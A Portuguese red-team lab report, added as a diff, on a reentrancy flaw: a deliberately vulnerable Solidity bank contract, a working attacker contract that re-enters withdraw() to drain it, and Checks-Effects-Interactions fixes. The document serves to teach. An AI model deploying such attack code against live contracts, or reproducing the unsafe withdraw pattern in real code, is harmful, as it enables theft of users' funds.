@@ -1,0 +1,110 @@
+================================================================================
+ARQUIVO: carpc_issue_lab4_reentrancy.txt
+TÍTULO: [carpc_issue] Vulnerabilidade de Reentrancy (Drenagem de Banco)
+AUTOR: Pesquisador de Segurança (Red Team)
+DATA: 2026-11-02
+VERSÃO: 1.0
+TAGS: #smart-contracts #solidity #reentrancy #dao-hack #red-team #lab4
+================================================================================
+
+## 1. DESCRIÇÃO DA VULNERABILIDADE
+
+O contrato VulnerableBank permite que usuários depositem e saquem ETH. No entanto, 
+a função `withdraw()` envia o ETH para o usuário ANTES de atualizar o saldo 
+interno do contrato. 
+
+Essa falha permite um ataque de Reentrancy: um contrato malicioso pode chamar 
+a função `withdraw()` repetidamente antes que a primeira transação termine, 
+drenando todos os fundos do banco.
+
+## 2. CONTRATO VULNERÁVEL (src/VulnerableBank.sol)
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract VulnerableBank {
+    mapping(address => uint256) public balances;
+
+    function deposit() public payable {
+        require(msg.value > 0, "Deposit must be greater than 0");
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() public {
+        uint256 balance = balances[msg.sender];
+        require(balance > 0, "Insufficient balance");
+
+        // VULNERABILIDADE: Envia o dinheiro ANTES de atualizar o saldo
+        (bool success, ) = msg.sender.call{value: balance}("");
+        require(success, "Transfer failed");
+
+        balances[msg.sender] = 0;
+    }
+
+    function getContractBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+
+## 3. CONTRATO DO ATACANTE (src/Attacker.sol)
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "./VulnerableBank.sol";
+
+contract Attacker {
+    VulnerableBank public bank;
+
+    constructor(address _bankAddress) {
+        bank = VulnerableBank(_bankAddress);
+    }
+
+    function attack() external payable {
+        bank.deposit{value: 1 ether}();
+        bank.withdraw();
+    }
+
+    receive() external payable {
+        if (address(bank).balance >= 1 ether) {
+            bank.withdraw();
+        }
+    }
+
+    function getStolenFunds() external {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+}
+
+## 4. PROVA DE CONCEITO (PoC)
+
+O teste em `test/Reentrancy.t.sol` demonstra que:
+1. O banco começa com 10 ETH (depósito da vítima).
+2. O atacante deposita 1 ETH e chama `attack()`.
+3. A função `receive()` do atacante é acionada, chamando `withdraw()` repetidamente.
+4. O banco é zerado e o atacante termina com 11 ETH.
+
+## 5. IMPACTO
+
+- Drenagem total dos fundos do contrato.
+- Em contratos reais, isso pode levar à perda de todos os fundos dos usuários.
+- Este é o mesmo tipo de falha que causou o The DAO Hack em 2016.
+
+## 6. RECOMENDAÇÃO (BLUE TEAM)
+
+- Utilizar o padrão Checks-Effects-Interactions: atualizar o saldo (efeito) 
+  ANTES de enviar o dinheiro (interação).
+- Utilizar o modificador `nonReentrant` da biblioteca OpenZeppelin.
+- Considerar o uso de `transfer` ou `send` em vez de `call` para envios simples 
+  (embora `call` seja recomendado para evitar problemas de gas).
+
+## 7. LIÇÕES APRENDIDAS
+
+- Reentrancy é uma das vulnerabilidades mais clássicas e perigosas em Solidity.
+- O padrão Checks-Effects-Interactions é a defesa mais simples e eficaz.
+- Testar com contratos maliciosos (como o Attacker) é essencial para validar 
+  a segurança de um contrato.
+
+================================================================================
+FIM DO DOCUMENTO
+================================================================================
